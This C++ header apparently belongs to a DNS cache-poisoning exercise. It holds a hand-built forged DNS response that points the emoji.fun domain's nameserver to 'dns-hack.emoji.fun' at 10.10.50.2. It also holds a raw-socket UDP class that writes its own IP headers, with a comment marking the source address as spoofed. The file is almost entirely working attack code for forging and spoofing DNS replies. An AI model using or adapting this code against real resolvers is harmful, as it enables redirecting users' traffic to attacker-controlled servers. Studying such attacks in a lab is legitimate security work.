#ifndef __UDP_PKT_H__
#define __UDP_PKT_H__

unsigned char answer[] = {
	0xe1, 0x8c, // Transaction ID
	0x80, 0x90, // Flags
	0x00, 0x01, // Questions
	0x00, 0x00, // Answer RRs
	0x00, 0x01, // Authority RRs
	0x00, 0x01, // Addictional RRs
	// Queries
		0x04, 0x6e, 0x65, 0x72, 0x64, 0x05, 0x65, 0x6d, 0x6f, 0x6a, 0x69, 0x03, 0x66, 0x75, 0x6e, 0x00, // Name (nerd.emoji.fun)
		0x00, 0x01, // Type        (A)
		0x00, 0x01, // Class       (IN)
	// Authoritative nameservers
		0xc0, 0x11, // Name        (emoji.fun)
		0x00, 0x02, // Type        (NS)
		0x00, 0x01, // Class       (IN)
		0x00, 0x09, 0x3a, 0x80, // Time To Leave (604800)
		0x00, 0x0b, // Data Lenght
		0x08, 0x64, 0x6e, 0x73, 0x2d, 0x68, 0x61, 0x63, 0x6b, 0xc0, 0x11, // Name Server (dns-hack.emoji.fun)
	// Additional Records
		0xc0, 0x2c, // Name        (dns-hack.emoji.fun)
		0x00, 0x01, // Type        (A)
		0x00, 0x01, // Class       (IN)
		0x00, 0x09, 0x3a, 0x80, // Time To Leave (604800) 
		0x00, 0x04, // Data Lenght (4)
		0x0a, 0x0a, 0x32, 0x02, //Address (10.10.50.2)
};

unsigned char question[] = {
	0x3d, 0x9d, // Transaction ID
	0x01, 0x20, // Flags               (Standard Query)
	0x00, 0x01, // Questions           (1)
	0x00, 0x00, // Answer RRs          (0)
	0x00, 0x00, // Authority RRs       (0)
	0x00, 0x00, // Addictional RRs     (0)
	// Queries
		0x04, 0x6e, 0x65, 0x72, 0x64, 0x05, 0x65, 0x6d, 0x6f, 0x6a, 0x69, 0x03, 0x66, 0x75, 0x6e, 0x00, // Name (nerd.emoji.fun)
		0x00, 0x01, // Type        (A)
		0x00, 0x01 // Class       (IN)
};

// Raw UDP sockets
#include <stdio.h>		//for printf
#include <string.h>		//memset
#include <sys/socket.h>	//for socket ofcourse
#include <stdlib.h>		//for malloc;
#include <netinet/udp.h>	//Provides declarations for udp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <netinet/in.h>	//
#include <arpa/inet.h>  //
#include <time.h>

class UDPacket {
	private:
	int s, s_port, d_port;
	struct iphdr *iph;
	char datagram[4096], source_ip[32], dest_ip[32];
	struct pseudo_header
	{
		u_int32_t 	source_address;
		u_int32_t 	dest_address;
		u_int8_t 	placeholder;
		u_int8_t 	protocol;
		u_int16_t 	udp_length;
	}; // 96 bit (12 bytes) pseudo header needed for udp header checksum calculation
	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;

	// Generic checksum calculation function
	unsigned short csum(unsigned short *ptr, int nbytes)
	{
		register long sum;
		unsigned short oddbyte;
		register short answer;
			sum = 0;
		while (nbytes>1) {
			sum += *ptr++;
			nbytes -= 2;
		}
		if (nbytes == 1) {
			oddbyte = 0;
			*((u_char*)&oddbyte) = *(u_char*)ptr;
			sum += oddbyte;
		}
		sum = (sum >> 16) + (sum & 0xffff);
		sum = sum + (sum >> 16);
		answer = (short)~sum;
		return(answer);
	}

	public:
	int error;
	int Send_Payload(const void* to_send, unsigned to_send_size) {

		//Datagram to represent the packet
		char *pseudogram, *data;

		//zero out the packet buffer
		memset (datagram, 0, 4096);

		//IP header
		iph = (struct iphdr*) datagram;
		iph->ihl = 5;
		iph->version = 4;
		iph->tos = 0;
		iph->id = htonl (54321); //Id of this packet
		iph->frag_off = 0;
		iph->ttl = 255;
		iph->protocol = IPPROTO_UDP;
		iph->check = 0;      //Set to 0 before calculating checksum
		iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
		iph->daddr = sin.sin_addr.s_addr;
		udph->source = htons (s_port);
		udph->dest = htons (d_port);
		udph->check = 0; //leave checksum 0 now, filled later by pseudo header
		psh.source_address = inet_addr( source_ip );
		psh.dest_address = sin.sin_addr.s_addr;
		psh.placeholder = 0;
		psh.protocol = IPPROTO_UDP;

		//Copy Data
		data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
		memcpy(data , to_send, to_send_size);

		//Fill in the IP Header
		iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + to_send_size;

		//Ip checksum
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);

		//UDP header
		udph->len = htons(8 + to_send_size); //tcp header size

		//Now the UDP checksum using the pseudo header
		psh.udp_length = htons(sizeof(struct udphdr) + to_send_size );

		int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + to_send_size;
		pseudogram = (char*)malloc(psize);

		memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
		memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + to_send_size);

		udph->check = csum( (unsigned short*) pseudogram , psize);

		//Send the packet
		if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		{
			perror("sendto failed");
			return 1;
		}
		return 0;
	}

	UDPacket(int _s_port, int _d_port, const char* _source_ip, const char* _dest_ip) {

		s_port = _s_port;
		d_port = _d_port;
		strcpy(source_ip, _source_ip);
		strcpy(dest_ip, _dest_ip);

		sin.sin_family = AF_INET;
		sin.sin_port = htons(80);
		sin.sin_addr.s_addr = inet_addr (dest_ip);

		//Create a raw socket of type IPPROTO
		error = 0;
		s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

		if (s == -1)
		{
			//socket creation failed, may be because of non-root privileges
			printf("Failed to create raw socket\n");
			error = 1;
		}
	}
};

#endif
